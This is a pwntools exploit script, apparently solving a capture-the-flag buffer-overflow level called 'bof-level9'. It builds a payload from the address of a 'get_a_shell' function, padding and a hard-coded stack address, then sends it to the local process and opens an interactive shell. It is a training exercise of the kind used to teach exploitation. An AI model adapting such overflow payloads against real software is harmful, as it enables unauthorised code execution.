#!/usr/bin/env python

from pwn import *

p = process('./bof-level9')

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

e = ELF('./bof-level9')
get_a_shell = e.symbols['get_a_shell']
print(hex(get_a_shell))

buf = p32(get_a_shell) + "A" * 0x78 + p32(0xffffc4cc)

print(p.recv())
p.sendline(buf)

p.interactive()
